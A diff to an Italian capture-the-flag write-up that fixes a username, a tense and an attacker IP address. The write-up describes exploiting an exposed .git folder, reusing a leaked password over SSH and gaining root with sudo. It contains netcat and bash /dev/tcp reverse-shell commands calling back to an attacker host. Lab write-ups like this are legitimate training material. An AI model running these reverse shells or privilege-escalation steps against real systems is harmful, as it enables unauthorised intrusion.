@@ -19,7 +19,7 @@ Durante la scansione, ho notato la presenza di una cartella `.git`, il che sugge
 
 Utilizzando `git-dump`, ho scaricato il contenuto del repository presente nella cartella `.git`.
 
-All'interno del repository, ho individuato un file `settings.php`, che conteneva una **password**.
+All'interno del repository, ho individuato un file `settings.php`, che contiene una **password**.
 
 ## 🔎 Identificazione di un Utente
 
@@ -61,7 +61,7 @@ nc -lvnp 4444
 E poi, dal server target, ho eseguito:
 
 ```bash
-busybox nc 10.10.11.102 4444 -e sh
+busybox nc 10.10.16.102 4444 -e sh
 ```
 
 Una volta dentro la macchina, ho migliorato l'interattività della shell con:
@@ -76,13 +76,13 @@ Ho quindi cercato gli utenti presenti nel sistema:
 cat /etc/passwd
 ```
 
-Ho individuato due utenti con una shell attiva, tra cui **john**. Ho provato ad accedere tramite **SSH**:
+Ho individuato due utenti con una shell attiva, tra cui **johncusack**. Ho provato ad accedere tramite **SSH**:
 
 ```bash
-ssh john@10.10.11.58
+ssh johncusack@10.10.11.58
 ```
 
-Usando la password trovata in `settings.php`, sono riuscito ad accedere all'utente **john** e recuperare la **flag user.txt**.
+Usando la password trovata in `settings.php`, sono riuscito ad accedere all'utente **johncusack** e recuperare la **flag user.txt**.
 
 ## 🚀 Privilege Escalation
 
@@ -109,7 +109,7 @@ E ho ottenuto la **flag root.txt**! 🏆
 Un'alternativa per ottenere una shell con privilegi di root sarebbe stata eseguire:
 
 ```bash
-sudo bee php-eval 'system("bash -c 'bash -i >& /dev/tcp/MIO_IP/4444 0>&1'")'
+sudo bee php-eval 'system("bash -c 'bash -i >& /dev/tcp/10.10.16.102/4444 0>&1'")'
 ```
 
 ## 🎯 Conclusione
